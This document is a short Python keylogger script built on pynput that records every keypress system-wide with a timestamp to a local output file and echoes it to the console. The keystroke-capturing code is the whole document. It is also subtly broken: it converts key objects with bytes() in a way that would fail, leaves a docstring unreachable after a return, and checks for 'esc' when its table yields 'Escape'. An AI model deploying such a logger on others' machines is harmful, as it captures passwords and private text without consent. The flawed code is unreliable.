from pynput.keyboard import Key, Listener
import time

output_file = "output.txt"


unicodeDictionary = {
        "\x08": "Backspace",
        "\x09": "Tab",
        "\x0A": "Line Feed",
        "\x0D": "Carriage Return",
        "\x1B": "Escape",
        "\x20": "Space",
        "\x21": "!",
        "\x22": '"',
        "\x23": "#",
        "\x24": "$",
        "\x25": "%",
        "\x26": "&",
        "\x27": "'",
        "\x28": "(",
        "\x29": ")",
        "\x2A": "*",
        "\x2B": "+",
        "\x2C": ",",
        "\x2D": "-",
        "\x2E": ".",
        "\x2F": "/",
        "\x3A": ":",
        "\x3B": ";",
        "\x3C": "<",
        "\x3D": "=",
        "\x3E": ">",
        "\x3F": "?",
        "\x40": "@",
        "\x5B": "[",
        "\x5C": "\\",
        "\x5D": "]",
        "\x5E": "^",
        "\x5F": "_",
        "\x60": "`",
        "\x7B": "{",
        "\x7C": "|",
        "\x7D": "}",
        "\x7E": "~",
        "\x7F": "Delete",
        "\x1a": "Ctrl + Z",
        "\x03": "Ctrl + C",
        "\x04": "Ctrl + D"
    }


# Function to get key combination for a given Unicode sequence
def getKeyCombination(unicodeSequence):

    if unicodeSequence in unicodeDictionary:
        return unicodeDictionary[unicodeSequence]
    else:
        return unicodeSequence

        """
    Function to retrieve the key combination for a given Unicode sequence.
    
    Args:
        unicodeSequence (str): Unicode sequence to be looked up in the dictionary.
    
    Returns:
        str: Key combination corresponding to the given Unicode sequence.
            Returns "Key combination not found" if the sequence is not in the dictionary.
    """
# Example usage with inputasd


def onKeyPress(key):
    currentTime = time.strftime("%H:%M:%S") # Get current time in 24-Hour format
    unicodeSequence = bytes(key, "utf-8").decode("unicode_escape")     # Convert the input string into bytes and decode it to interpret escape sequences properly
    keyCombination = getKeyCombination(unicodeSequence)                     
    print(f'Press: {keyCombination} \t at {currentTime}') # Print the formatted key and timestamp in the console
    with open(output_file, "a+") as file:
        file.write(f'{keyCombination} \t at {currentTime}\n') # Write the formatted key and timestamp to the output file

# Function to handle key release eventsa
def onKeyRelease(key):
    unicodeSequence = bytes(key, "utf-8").decode("unicode_escape")     # Convert the input string into bytes and decode it to interpret escape sequences properly
    keyCombination = getKeyCombination(unicodeSequence)    
    print(f'Release: {keyCombination}')    # Print the released key to the console
    if keyCombination == "esc":
        return False    # Stop the listener if ESC is pressed

# Set up listener for keyboard events
with Listener(on_press = onKeyPress, on_release = onKeyRelease) as listener:
    listener.join() # Start the listener and wait for events